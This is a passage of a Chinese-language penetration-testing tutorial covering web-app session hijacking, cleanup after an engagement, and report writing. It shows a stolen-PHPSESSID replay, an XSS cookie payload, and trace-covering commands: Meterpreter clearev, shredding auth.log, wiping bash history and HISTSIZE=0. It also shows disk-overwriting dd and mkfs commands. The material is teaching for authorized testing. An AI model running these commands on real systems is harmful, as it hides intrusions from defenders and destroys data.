  \ sqlmap 中直接运行破解。根据输出，它已成功破解了这些用户的密码。\n\n之后，它将转储 users 表，包括密码以及完整的列，如下所示：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_206_0.png)\n\
  \n然后它将枚举下一个表，在本例中是 guestbook：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_206_1.png)\n\
  \n这只是 sqlmap 所能做的冰山一角。它是一个极其有用且功能强大的工具，但使用起来非常简单。\n\n## 错误处理问题\n\n使用 OWASP ZAP，你还可以检查\
  \ Web 应用程序中的错误处理问题。你希望能够让用户了解问题可能是什么，但不要披露太多信息。例如，如果有人尝试登录网站，而密码错误，你不想告诉用户密码不正确，因为这会让对方知道用户名是正确的，只是密码不对。你处理这种情况的方式就是只说登录凭据不正确。\n\
  \n使用 OWASP，你还可以扫描错误披露问题。下面是实验室中的一次扫描，你会注意到它发现了一些问题：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_207_0.png)\n\
  \n如果我浏览其中一个页面，你会看到我不仅仅得到一个 404 页面未找到，我会得到一些额外的信息，这些信息可能不应该向用户披露，如下所示：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_207_1.png)\n\
  \n\n\n理论上，错误信息应该是通用的，让你知道页面不存在，但不会透露任何其他信息，类似于下面来自 google.com 的页面。现在我们仍然收到 404 错误，因此我们知道该页面不存在，但它没有提供任何额外信息，这比上面的示例更好：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_208_0.png)\n\n## Session management\n\
  \n确保在使用 Web 应用程序时他人无法劫持你的会话非常重要。否则，他们不仅能够看到你在做什么，还能用你的信息购买商品。Web 应用程序必须具备防范会话劫持的安全措施。会话可以有各种类型。例如，它们可以使用\
  \ cookie，或在 URL 中，甚至使用隐藏字段。无论会话类型如何，它们都应唯一属于某个用户，并且不能被其他用户窃取或查看。\n\n使用以下一些工具，我将测试一些\
  \ Web 应用程序是否存在会话劫持问题。\n\n## Burp Suite with intercept\n\nBurp Suite 是一个相当全面的产品，具有许多执行大量不同功能的模块。功能列在顶部，包括\
  \ Proxy、Spider、Intruder、Repeater 等。由于我们讨论的是会话操纵，我们将使用 Proxy 和 Intercept 功能。这将允许我们尝试中间人连接并窃取会话信息。其他功能也允许以其他非常强大的方式测试你的\
  \ Web 应用程序，但超出了本会话管理部分的范围。有关这些部分的更多信息，你可以查看 Burp Suite 帮助页面：https://portswigger.net/burp/help/suite_burptools.html。\n\
  \n现在，让我们接下来试用 Proxy 功能。要使用 Proxy 和拦截功能，我们首先需要记录一个有效的会话。如何将流量引导至 Burp Suite 完全取决于你。我将使用一个假的代理服务器设置，让客户端在我这里经过后再到达最终目的地。这将使我能够看到他们的会话\
  \ ID，并希望将其回放给目标应用程序，从而无需登录即可进入。为此，我将假设代理服务器设置已经完成。\n\n我将前往我的模拟客户端机器，并登录一个用于测试的网站。我会确保在\
  \ Burp Suite 中已打开拦截。你可以在下面看到该选项：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_209_0.png)\n\
  \n然后我将前往我的客户端机器，并登录我在实验室中要测试的网站：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_209_1.png)\n\
  \n在客户端机器上浏览时，如果已打开拦截，你需要为每个请求点击转发。\n\n一旦我到达登录页面，我将登录并进入主登录页面。\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_210_0.png)\n\
  \n登录后，我将刷新页面以验证我仍处于登录状态，然后获取 PHPSESSID。我将复制该 ID，并粘贴到我选择的文本编辑器中。记住，你需要在任何连接上点击转发，包括刷新。\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_210_1.png)\n\n完成后，我将打开我的本地浏览器，该浏览器也通过代理。这将是黑客电脑。我将访问同一个网站，但确保直接进入登录后显示的页面，在本例中根据上面的\
  \ `GET` 命令是 `index.php`：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_211_0.png)\n\
  \n现在，由于我也在拦截它，我将查看 RAW 输出。在点击转发之前，我将把新连接中获得的 `PHPSESSID` 改为上面获取的那个：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_211_1.png)\n\
  \n然后我将删除该 ID，并粘贴上面的那个。以下截图显示旧会话 ID 已替换我的新 ID：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_212_0.png)\n\
  \n一切就绪后，我将点击转发，我的浏览器将直接进入 index.php 页面，而无需我输入任何凭据，因为我能够从已登录的另一用户那里窃取会话。\n\n## Using\
  \ XSS for cookie retrieval\n\n当我们在上一节讨论跨站脚本时，我插入的脚本只是输出一个警告消息。但从技术上讲，你可以将脚本添加到其他内容中。一个选项是通过让脚本抓取当前会话\
  \ ID 并发送给黑客来检索其他用户的会话信息。这样，他们就能在用户登录应用程序时抓取所有会话 ID。\n\n在我的示例中，我将仅通过警告框将会话 ID 输出到屏幕，以便我们验证会话\
  \ ID 是否存在，但稍作修改后，你可以让它发送给黑客。\n\n为此，我将使用以下方法访问该会话 ID 信息：\n\n```\n<script>alert(document.cookie)</script>\n\
  ```\n\n现在，当该脚本在客户端浏览器中运行时，我可以看到用户的会话 ID 在该警告菜单中弹出：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_213_0.png)\n\
  \n这是一种非常简单的方式来获取并使用其他用户的会话信息，而无需你自己登录这些应用程序。\n\n## Summary\n\n我们现在完成了第 8 天，让我们回顾一下。我们讨论了\
  \ Web 应用程序安全的各种 OWASP 类别，包括基础设施和设计缺陷、基于身份的测试、验证数据/错误处理和逻辑、会话管理，最后是客户端测试的操纵。我在实验室中使用了各种工具来搜索每个类别中存在问题的\
  \ Web 应用程序。这些工具都在 Kali Linux 中运行，并提供了它们披露的问题的大量信息。\n\n在下一章中，我将谈论如何退出环境并进行清理，因为渗透测试即将结束。这是一项重要任务，因为我们不想留下任何发现或信息。此外，我们希望确保在渗透测试之前环境与我们找到时一样。\n\
  \n我将介绍如何清理我们留下的痕迹，以及如何掩盖我们的踪迹并销毁我们可能需要的任何设备。很多内容最终将取决于与利益相关者讨论的初始参与范围。\n"
- "## 9\n\n## Cleaning Up and Getting Out\n\n随着我们与利益相关者的参与接近尾声，并且所有测试都已完成，是时候我们做必要的整理工作然后退出环境了。\n\
  \n重要的是确保我们离开的环境与我们开始渗透测试之前完全相同。软件应与测试前相同，硬件也应相同。我们引入环境中的任何新东西都应撤销。我们的任务是将发现和文档移交给利益相关者，让他们根据自己的日程和优先级执行认为必要的修复工作。\n\
  \n本章将讨论以下主题：\n\n- 掩盖你的踪迹\n- 清理留下的痕迹\n- 销毁设备\n\n## Cleaning up any trails left behind\n\
  \n作为渗透测试人员，我们能做的最重要的事情之一就是让环境保持参与前的原状。这意味着我们需要确保系统上我们放置的任何东西都已被移除。以下列表只是作为负责任的渗透测试人员我们需要做的事情中的一些：\n\
  \n- 删除为任何测试或程序创建的任何用户或系统账户。我们不想留下任何未监控的账户。\n- 删除我们在测试过程中可能遗留的任何漏洞利用、后门、Rootkit 或恶意软件。\n\
  \n\n\n- 删除在测试期间遗留在服务器上的任何测试证据。我们本应将这些证据转移到我们的 C&C 服务器以便安全保存，但在某些情况下可能无法做到。因此，我们要确保不会留下任何痕迹。\n\
  - 删除在任何测试期间使用的任何工具或脚本。我们不希望其他人在事后利用我们的工具攻击公司。\n- 确保任何被修改或更改的系统都恢复到出厂默认设置。这可以通过恢复我们在更新该系统之前制作的黄金镜像、从文件或系统的最后备份中恢复，或直接将值改回原始值来实现。我们具体怎么做以及做什么最终取决于利益相关方希望我们执行的操作。\n\
  - 删除在渗透测试期间使用的所有不属于客户的设备。这可能包括电缆、计算机和其他设备。\n- 从日志文件中删除任何可能表明你所做操作的命令。\n- 清除任何网络层日志，以便没有人知道你何时何地在环境中活动。\n\
  \n## 掩盖你的踪迹\n\n在为我们的渗透测试完成对各个服务器上的所有任务后，现在轮到我们掩盖踪迹了。我们要确保不会留下任何关于我们做了什么以及在哪里做的证据。为了实现这一点，让我向你展示一些可以用来帮助清理你所做操作痕迹的实用工具。\n\
  \n### 使用 Metasploit 的 Clearev\n\n在 Metasploit 中，有一个脚本可以清除 Windows 事件日志。它会清除系统上包含的所有事件日志。它只需一条命令就能节省大量时间和人工操作。将此实用工具打包到\
  \ Metasploit 中是非常聪明的设计。\n\n唯一的限制是它仅在你入侵了 Windows 系统时才受支持。当你入侵任何其他操作系统时，此特定菜单项将不可用。\n\
  \n使用 clearev 的过程相当简单。你首先需要入侵某种 Windows 主机。一旦完成，你将到达以下提示：\n\n```\nmeterpreter >\n\
  ```\n\n一旦到达此提示，你就知道已成功入侵主机。要查看可用的选项，在提示符下输入 help 以查看所有可用选项。如果主机是 Windows 机器，你应该在\
  \ System 部分下看到 clearev 选项。要清除这些日志，只需在 meterpreter 提示符下输入命令 clearev。无需传递任何参数。以下是我在实验室中遵循的过程：\n\
  \n```\nmeterpreter > clearev\n[*] Wiping 45 records from Application...\n[*] Wiping\
  \ 219 records from System...\n[*] Wiping 5 records from Security...\nmeterpreter\
  \ >\n```\n\n根据输出，你可以看到哪些日志已被清除以及删除了多少条消息。\n\n### 使用 shred 销毁文件\n\n当你真的需要确保文件和分区彻底消失时，你可能想使用\
  \ shred。与仅删除指针的 rm 不同，shred 会多次覆盖文件，试图确保其无法被任何工具恢复。这对于整个分区也同样适用。\n\nshred 是我清除文件时最喜欢的命令之一。shred\
  \ 有几个可用的选项；让我们看看以下选项的输出：\n\n```\nroot@pi-kali:~# shred --help\nUsage: shred [OPTION]...\
  \ FILE...\nOverwrite the specified FILE(s) repeatedly, in order to make it harder\n\
  for even very expensive hardware probing to recover the data.\n\nIf FILE is -, shred\
  \ standard output.\n\nMandatory arguments to long options are mandatory for short\
  \ options too.\n -f, --force    change permissions to allow writing if necessary\n\
  \ -n, --iterations=N  overwrite N times instead of the default (3)\n     --random-source=FILE\
  \  get random bytes from FILE\n -s, --size=N   shred this many bytes (suffixes like\
  \ K, M, G accepted)\n -u             truncate and remove file after overwriting\n\
  \     --remove[=HOW]  like -u but give control on HOW to delete;  See below\n -v,\
  \ --verbose  show progress\n -x, --exact    do not round file sizes up to the next\
  \ full block;\n                this is the default for non-regular files\n -z, --zero\
  \     add a final overwrite with zeros to hide shredding\n     --help     display\
  \ this help and exit\n     --version  output version information and exit\n\nDelete\
  \ FILE(s) if --remove (-u) is specified.  The default is not to remove\nthe files\
  \ because it is common to operate on device files like /dev/hda,\nand those files\
  \ usually should not be removed.\nThe optional HOW parameter indicates how to remove\
  \ a directory entry:\n'unlink' => use a standard unlink call.\n'wipe' => also first\
  \ obfuscate bytes in the name.\n'wipesync' => also sync each obfuscated byte to\
  \ disk.\nThe default mode is 'wipesync', but note it can be expensive.\n```\n\n\
  在我的实验室中，我想对 auth.log 文件进行 shred 处理，但也想删除该文件。为此，我将运行以下命令：\n\n```\nshred -vfzu auth.log\n\
  ```\n\n以下是我实验室的输出：\n\n```\nroot@pi-kali:/var/log# shred -vfzu auth.log\nshred: auth.log:\
  \ pass 1/4 (random)...\nshred: auth.log: pass 2/4 (random)...\nshred: auth.log:\
  \ pass 3/4 (random)...\nshred: auth.log: pass 4/4 (000000)...\nshred: auth.log:\
  \ removing\nshred: auth.log: renamed to 00000000\nshred: 00000000: renamed to 0000000\n\
  shred: 0000000: renamed to 000000\nshred: 000000: renamed to 00000\nshred: 00000:\
  \ renamed to 0000\nshred: 0000: renamed to 000\nshred: 000: renamed to 00\nshred:\
  \ 00: renamed to 0\nshred: auth.log: removed\n```\n\nshred 如此有效，以至于许多人在处理硬盘时都会使用它，无论是卖给他人还是丢弃，只是为了确保其无法读取。\n\
  \n### 隐藏踪迹的 CLI 技巧\n\n无论你时间紧迫，还是只是想做一些基本的隐藏踪迹操作，你也可以使用一些 CLI 技巧来完成。当我登录我的 Linux\
  \ 主机时，我可以看到 .bash_history 文件会记录我所做的事情。如果我现在查看我的文件，我可以看到最近几个命令：\n\n```\nroot@pi-kali:~#\
  \ more .bash_history\nbluesnarfer -r 1-100 -C 13 -b\n58:40:4E:50:D1:0E\napt-get\
  \ install bluepot apt-get install bluemaho\nhcitool -i hci0 rssi 8C:DE:52:1F:F5:07\n\
  sudo rfcomm connect 0 8C:DE:52:1F:F5:07 10 >/dev/null&\n```\n\n我只需使用空重定向 (>) 即可清空此文件。这适用于你想要清空的任何文件：\n\
  \n```\nroot@pi-kali:~# > .bash_history\nroot@pi-kali:~# more .bash_history\nroot@pi-kali:~#\n\
  ```\n\n这个选项可行，肯定没有 shred 那么优雅，但在某些情况下必须这样做。但是，如果你不想再次处理这个问题，或者想限制 .bash_history\
  \ 文件中保留的内容呢？好吧，让我展示如何更改它。从 CLI，你可以 echo $HISTSIZE 来查看当前历史记录大小的设置。我的目前设置为 500，如以下命令所示：\n\
  \n```\nroot@pi-kali:~# echo $HISTSIZE\n500\n```\n\n如果我想更改它，可以通过更新此值来实现。如果将其设置为 0，则永远不会保留历史记录。在运行各种测试时更改此设置是个好主意，这样你就不会忘记稍后更改它。不过，完成后请记得改回原值。要更改，只需使用适当的值运行\
  \ export 命令。你需要注销并重新登录才能使此值生效：\n\n```\nroot@pi-kali:~# export HISTSIZE=0\nroot@pi-kali:~#\
  \ echo $HISTSIZE\n0\nroot@pi-kali:~# more .bash_history\nroot@pi-kali:~#\n```\n\n\
  现在，我运行的任何命令都不会显示在该 .bash_history 文件中。非常适合在该机器上隐藏你的踪迹！\n\n你也可以选择直接编辑日志文件并删除你不希望他人看到的任何行。这可以使用你喜欢的文本编辑器（vi、nano、vim\
  \ 等）完成。这很基础，但在删除你不希望他人看到的内容方面很有效。\n\n### Windows 的 ClearLogs\n\nClearLogs 是适用于基于\
  \ Microsoft Windows 的系统的事件日志清理工具。它会清除所有类型的事件日志，包括安全、系统或应用程序日志。此实用工具使渗透测试人员极易清除自己的踪迹，并在最终节省大量时间。手动完成此任务肯定会涉及一些繁琐的清理。\n\
  \n\n\n在桌面上运行 **ClearLogs** 可实现快速简便的删除流程。不过请注意，此命令需要以管理员身份运行才能正常工作。通常，我右键单击图标并选择\
  \ **Run as administrator**，如下图所示：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_220_0.png)\n\
  \n在下一张截图中，您可以看到事件日志充满了信息：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_220_1.png)\n\
  \n应用程序加载后会出现以下屏幕。请注意，这里没什么可操作的，除了 **Clear All System Logs** 或 **Cancel** 按钮。在我们的情况下，我们想要清除所有日志，因此请点击\
  \ **Clear All System Logs** 按钮：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_221_0.png)\n\
  \n您将开始看到正在被删除的所有日志的逐项状态：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_221_1.png)\n\
  \n在下面的截图中，您可以看到使用 ClearLogs 之前和之后的事件日志。它已快速删除了所有相关信息：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_222_0.png)\n\
  \n## 使用 DD 和 mkfs 清除驱动器\n\n需要注意的一点是，删除文件实际上并不会删除文件。我们在谈论 shred 时之前提到过这一点。因此，如果您想要真正删除文件并且需要\
  \ shred 的另一种选择，DD 就是答案。此实用程序允许我们将文件复制到我们选择的任意目标位置。然而，我们也可以使用此实用程序向任何分区写入随机数据。在以下命令中，我将向我选择的分区写入随机字符。这将确保之前的数据确实被覆盖，而不是仅仅删除指针：\n\
  \n```\ndd if=/dev/urandom of=/dev/sda2\n```\n\n前一个命令与我们用于复制分区的命令之间的主要区别在于，输入文件是一个实际文件，而不是\
  \ /dev/urandom。与 dd 类似，我们也可以使用 mkfs.ext4 为分区重新格式化并使用新的文件系统。要在前一个分区上实现此操作，类似的命令如下：\n\
  \n```\nmkfs.ext4 /dev/sda2\n```\n\n使用命令行隐藏踪迹的选项有很多。确保您了解每种选项的优缺点，以便做出明智的决定。\n\n\
  ## LUKS Nuke 销毁分区\n\n到目前为止，我们讨论了通过粉碎、删除文件中的行或删除文件本身来隐藏踪迹的选项。我们还讨论了覆盖分区。这些方法各有利弊，但如果您想在特定时间使用特定关键字来实现这一点会怎样？那么事情就会变得相当棘手。这就是\
  \ LUKS Nuke 登场的地方。它允许您向远程主机发送信号，让其自行销毁，类似于远程自毁信号。\n\nLUKS Nuke 通过与 LVM 和磁盘加密配合工作来实现这一点。当机器启动时，您需要输入密码。如果您输入自毁密码，机器将删除所有保存的密钥，从而基本使所有数据无法访问。此功能已在\
  \ Kali 1.06 版本中实现。这是一种确保数据受保护的简便方法，并且无需完全登录即可执行自毁操作。这是对用户的极大保护，尤其是那些可能携带敏感信息的人员，例如渗透测试人员。\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_223_0.png)\n\n如果您想更详细地了解 LUKS Nuke，请查看以下链接：\n\
  \n```\nhttps://www.kali.org/tutorials/nuke-kali-linux-luks/\nhttp://www.zdnet.com/article/developers-mull-adding-data-nuke-to-kali-linux/\n\
  ```\n\nLUKS Nuke 是一个很棒的小功能，可帮助保护您的个人数据以及您可能拥有的任何客户数据。\n\n## 销毁设备\n\n有时在任务结束后必须销毁设备。这可能是因为有相关政策要求，也可能是出于预防措施，因为某些系统上可能存在敏感数据。无论如何，销毁设备的需求有时会出现，并可能成为利益相关方会议谈判的一部分。\n\
  \n## 由利益相关方赞助的销毁\n\n许多组织，尤其是注重安全的组织，可能要求任何可能离开其环境的物理设备必须被物理销毁。这很可能在利益相关方会议期间讨论过。作为负责任的渗透测试人员，您需要确保此任务按照利益相关方的确切要求执行。此时也可能会提到保管链。\n\
  \n保管链是一系列文件，以最简单的形式显示任何 IT 硬件的安全占有和安全转移。任何硬件被带离现场进行销毁时，从 A 点到 B 点的整个过程都需要完整记录。一些销毁公司甚至会记录整个过程，以确保公司也能看到整个流程。\n\
  \n如果您为要求此类活动发生的公司工作，在初次会议期间创建一个表格供他们参考并不是一个坏主意。这样，他们将了解流程并看到您非常重视这些敏感数据。\n\n以下是一个硬件销毁保管链表格的示例。您可以随意使用并修改与特定客户要求相关的任何内容：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_224_0.png)\n\n## 由渗透测试人员进行的销毁\n\n即使您进行渗透测试的公司可能没有具体政策，出于安全考虑，销毁客户现场的任何设备可能仍符合您的最佳利益。我们讨论了很多通过软件销毁数据的方法，但物理销毁也是一种选择。\n\
  \n需要考虑销毁的最重要项目是数据可能存在的地方。这包括任何非易失性存储，例如闪存盘、SSD 和硬盘。如果这些设备落入错误的人手中，如果设备未被正确销毁，其中的数据可能会被窃取。\n\
  \n我们如何销毁设备最终取决于设备的类型。对于任何设备，您都可以将其粉碎。这会将其变成类似以下图像中所示的大堆碎屑。这几乎适用于任何设备：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_225_0.png)\n\
  \n您也可以在驱动器上钻孔。以下是我实验室的一块硬盘，我通过钻孔将其销毁。粉碎它会更有趣，但我没有合适的设备：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_226_0.png)\n\
  \n最后，由于我有几块用于各种功能的 Raspberry Pi，我倾向于在每次客户任务后物理销毁 microSD 卡。这样，我可以向客户保证我没有他们的任何数据并且不会带走。以下是我在离开其中一个客户任务之前将其摔碎成许多碎片的\
  \ microSD 卡之一：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_226_1.png)\n\n## 总结\n\
  \n我们现在已完成本章，让我们回顾一下。由于我们已完成参与所需的全部渗透测试，我们需要确保清理我们造成的任何混乱，就像我们的母亲教导我们的一样。作为专业人士，确保我们离开的环境与开始时相同并且不留下任何痕迹非常重要。为此，我们讨论了应确保完成的各种项目，基本上是一个清理清单。为此，我们讨论了隐藏踪迹的实用程序，例如\
  \ shred、dd、ClearLogs 和 cleanenv。它们在何处何时使用各有专长，所有这些都应包含在渗透测试人员的工具箱中。\n\n接下来，由于根据利益相关方的要求和/或数据敏感程度，可能需要进行物理销毁，我们讨论了物理销毁硬件的各种方法。然而，在某些情况下，我们可能需要聘请第三方硬件销毁公司，因此我们讨论了保管链，我还包含了一个表格，可用于确保一切按相关方要求完成。\n\
  \n在下一章中，我将讨论本书的最后一个主题：撰写渗透测试报告。这将是我们运行的所有章节和测试的集大成。我们收集的所有信息将被整理成一份非常详细的报告，并发送给资助渗透测试的利益相关方。\n\
  \n我将介绍报告中应包含的各种项目以及我偏好的语法和布局，仅举几例。这份报告将是您的交付成果，因此它需要尽可能完美，以体现您的工作有多出色。我们绝对希望确保其中包含优质信息，以便向利益相关方展示我们作为渗透测试人员的价值。\n\
  \n\n"
- "## 10 编写渗透测试报告\n\n这最后一天标志着渗透测试的 culmination。过去 9 天我们学习并围绕各种主题进行实验。直到现在，我们一直关注使用各种工具测试公司的各个部分是否存在任何与安全相关的漏洞或差距。所有这些活动为我们提供了所需的信息和证据。今天，我们关注的是将所有证据和发现整理成交付给客户的最终成果——渗透测试报告。\n\
  \n在本节中，我们将讨论如何创建渗透测试报告。从收集我们生成的所有数据开始，到讨论最终报告的实际结构，再到最终构建并交付最终产品。报告的结构和布局是我个人偏好，基于我在报告两方面的经验（有时是测试人员，有时是利益相关者），以及来自第三方审计的接收方。因为这个原因，我积累了一些重要的经验，关于我认为展示数据最有效的方式。然而，随着你制作报告并与利益相关者交流，你自己也会获得这些宝贵的见解，并根据自己的认知定制结构和流程。这完全可以接受，因为这些报告往往非常个人化。\n\
  \n本章将讨论以下主题：\n- 收集你的所有数据\n- 定义风险的重要性\n- 渗透测试报告的结构\n- 构建报告\n- 交付报告\n\n### 收集你的所有数据\n\
  \n现在所有测试都已执行，证据也已收集，是时候收集我们所有的数据了。希望你一直将其很好地组织在你的 C&C 服务器上，这样整个过程会容易得多。通常，我通过将数据分解为三个部分来开始整个过程。这将开始让我达到最终结构的过程，使我能够将所有数据转化为最终产品。\n\
  \n我将信息分解为以下三个初始类别：\n- 报告\n- 图表\n- 漏洞/发现信息\n\n然后，我将包含截图、脚本和笔记的漏洞证据移至各自的漏洞中，按漏洞排序。这使得写作迁移更容易。\n\
  \n例如，回看第 8 章《Web 应用程序攻击》，我通常会将第 4 章《漏洞扫描和 Metasploit》的漏洞证据分解为以下类别：\n- Web 应用程序漏洞\n\
  - 客户端漏洞\n- 基础设施漏洞\n- 设计漏洞\n- 身份漏洞\n- 会话管理漏洞\n- 验证漏洞\n- 错误处理漏洞\n- 逻辑漏洞\n\n完成此步骤后，我会再次精炼所有漏洞证据。这次精炼到实际的漏洞。例如，取前面其中一个类别，客户端漏洞，我会将其分解为实际存在的问题：\n\
  - Web 应用程序漏洞\n- 客户端漏洞\n- 反射型 XSS 漏洞\n- 存储型 XSS 漏洞\n\n然后，我会将所有相关证据放入前述分类中。这将允许我在漏洞存在于多个地方时对常见漏洞进行分组。一个很好的例子是，我在不同位置有多个不同的\
  \ Web 应用程序，都容易受到存储型 XSS 攻击。\n\n一旦所有证据都组织好，你会发现它确实使生成报告的过程变得容易得多。\n\n### 定义风险的重要性\n\
  \n定义风险几乎就是进行渗透测试的全部原因。风险定义了特定漏洞在特定环境中影响程度的大小或无影响程度。\n\n通常，风险是根据 NIST SP 800-30 定义的。该文档是进行风险评估的绝佳指南。它包含风险信息的所有基础，包括风险管理流程、风险评估、重要风险概念以及风险评估的应用。然后它深入探讨实际的风险评估流程，从准备到执行，再到沟通，最后维护风险评估。请记住，风险可能特定于个人、公司或情况。例如，如果客户在某个与所有其他系统隔离的开发机上运行默认实例的\
  \ MySQL 并使用默认密码，其风险等级不会与该实例在生产环境中运行的风险等级相同。\n\n下图很好地展示了风险如何受关键风险因素影响，例如，来自特定来源的特定事件对组织造成不利影响的风险（或可能性）：\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_231_0.png)\n\n为了确定漏洞或发现的特定风险，我们将漏洞通过类似以下由\
  \ NIST 设计的图表进行评估。基于此结果，我们可以使用我们定义的风险图表分配类别或数字：\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_231_1.png)\n\
  \n另一种看待风险的方式，也是我最喜欢的关于风险的 NIST 图表之一，就是查看整体可能性图表。该图表采用两种不同的输入。第一个是事件发生的可能性。第二个输入是事件导致不利影响的可能性。答案就是你的风险或可能性：\n\
  \n| 威胁事件发起或发生的可能性 | 威胁事件导致不利影响的可能性 |  |  |  | |\n| | 非常低 | 低 | 中等 | 高 | 非常高 |\n\
  | 非常高 | 低 | 中等 | 高 | 非常高 | 非常高 |\n| 高 | 低 | 中等 | 中等 | 高 | 非常高 |\n| 中等 | 低 | 低 |\
  \ 中等 | 中等 | 高 |\n| 低 | 非常低 | 低 | 低 | 中等 | 中等 |\n| 非常低 | 非常低 | 非常低 | 低 | 低 | 低 |\n\
  \n图表乍一看可能令人困惑，但当你思考一个例子并将其应用于此图表时，一切都变得非常合理。让我们举一个例子来展示图表的使用。假设我们在某个远程测试服务器上有一个\
  \ SSH 漏洞。如果威胁事件发生，影响将是高的。然而，SSH 受到防火墙保护，并且仅允许一个单一 IP 地址访问。由于只有少数地址被允许通过 SSH 访问该服务器，威胁事件发起或发生的可能性非常低。基于所有这些，我们可以看到总风险为低。该图表的优点在于，如果你将此相同示例应用于另一个环境，它可以真正展示其威力。基于初始评估，我们知道如果此\
  \ SSH 漏洞发生，影响将是高的。现在，假设此环境与第一个不同，SSH 对全世界开放。现在，此事件发生的可能性非常高。\n\n基于此信息，我们可以看到该漏洞在此环境中的风险非常高，即使在另一个环境中它被列为低风险。这展示了定义风险的威力。此图表是一个很好的参考，应作为确定环境内风险的基础。\n\
  \n### 渗透测试报告的结构\n\n渗透测试的结构可能因人而异。每个人都有自己的想法和观点，认为应该包含什么、不应该包含什么以及如何措辞。我不认为渗透测试报告必须以特定方式呈现且仅以该方式呈现。对我来说，只要你在最初的利益相关者会议上承诺交付的内容得到交付，那就应该没问题。然而，注意我说的是“可以”而不是“优秀”。我收到过一些在交付承诺内容方面全部达标的渗透测试报告，但报告中的内容和思考显然不够透彻和完整。我们将在“构建报告”部分更详细地讨论这个问题。\n\
  \n现在，关于渗透测试报告的结构，我倾向于在所有报告中都包含某些部分，无论参与规模大小。这些是各部分以及我放入其中的一些信息，以及我认为它们应出现在每份渗透报告中的原因。\n\
  \n![](img/095df2cd1930baecbcecaa51ee3417aa_233_0.png)\n\n这些不一定必须是你报告中的内容。让它们成为你自己的活文档，并尝试和探索如果你在报告的另一端会觉得有用的选项。记住，一种尺寸并不适合所有人。\n\
  \n### 封面页\n\n封面页可能看起来并不太重要，但它确实为整个报告定下了基调。它是利益相关者首先看到的东西，所以它需要看起来不错。它应该包含适当的标志，既有你的，也有你进行测试的公司。确保标志大小正确且看起来不错，而不仅仅是从他们网站上剪切下来的东西。正确地营销自己不仅有助于提升你的个人品牌，还能吸引利益相关者想要阅读报告。\n\
  \n相关信息例如所执行工作的高层级名称。例如，它是“Penetration Testing of Corporation ABC Headquarters”还是更像是“Web\
  \ Application Report for Corporation ABC”？这为用户设定了报告的范围，或者更确切地说，是期望的受众和范围。如果用户不处理\
  \ Web 应用程序方面的工作，那么最后一个选项与他们无关，因此他们不会阅读它。\n\n我始终包含的最后一个主要信息是时间线。例如，如果我每年运行测试，我会写类似“Annual\
  \ 2017 Report”。如果我按季度运行这些测试，报告将类似于“Quarter 1 2017 Report”。这有助于设定报告的整体时间线。\n\n\n\n\
  ## 目录\n\n像任何良好且详尽的文档一样，目录是必要的。这些报告的长度可能相当大，取决于任务的范围和时间线。此外，环境的是否安全或不安全在决定报告最终长度方面也可能起着极其重要的作用。但无论如何，你需要读者能够看到信息在报告中的位置，而无需逐页滚动查找，例如各种风险等级的定义。确保目录包含页码，正是出于这个原因。你绝对不必过于深入地探讨什么构成进入目录的内容，而不是仅仅并入更大的章节。然而在我看来，如果它是与前一节的关键区别，就应在目录中予以适当注明。\n\
  \n## 执行摘要\n\n执行摘要就是这样，为高层管理人员设计的摘要。它应是对项目的简要概述，包括谁、什么、在哪里、何时，以及非常高层次的如何。这里不应提及任何具体的测试或软件工具。我总是给出结果的高层次视图，以及我的建议，但远不及我在《详细发现》部分将解释的深度。此外，由于组织的对安全的理解可能存在差异，可能存在安全脱节，因此我会表达可能需要表达的任何紧迫性或优先级。这通常是我如何结束执行摘要的方式。\n\
  \n## 项目范围\n\n对于本节，我重申我们在初始会议期间与利益相关者讨论过的范围。这包括诸如测试位置、分析的 IP 空间、涉及的应用程序以及渗透测试类型（例如，外部或内部）等内容。这样，任何阅读报告的人都能了解测试了什么，以及为什么进行测试，以及可能未进行测试的内容。例如，我们可能会说明渗透测试的范围是我们的迈阿密地点，并且我们的在线客户关系应用程序的\
  \ Web 应用程序在此次测试范围内。我们还需要提及对项目施加的任何限制，包括诸如时间框架、分配的资源以及公司预算等项目。所有这些项目都会影响我们作为渗透测试人员所做工作的范围。本节将有助于概述整个报告。\n\
  \n## 渗透测试的目标\n\n对于渗透测试的目标部分，这里目标只是概述我们被聘请进行渗透测试的原因或原因。例如，网络或应用程序中是否发生了导致我们介入的入侵？或者，这是开始接受信用卡并需要符合\
  \ PCI 合规性的一部分举措？务必始终解释您的服务将如何帮助您实现公司的目标和目标。\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_235_0.png)\n\
  \n确保您解决原始范围文件和利益相关者会议中的所有目标。重要的是，原本承诺的一切都已完成。\n\n## 风险评级尺度描述\n\n风险在渗透测试中起着巨大作用，但在测试完成后公司如何推进也起着重要作用。我见过只有中高风险评级事件被关注的情况。因此，明确定义您的风险评级尺度并彻底解释每个不同级别非常重要。您永远不想让任何风险等级开放解释，因为这可能导致混淆，并可能导致客户的错误修复路径。\n\
  \n关键性级别及其定义方式是开放解释的。您可以创建自己的或使用已定义的。\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_235_1.png)\n\
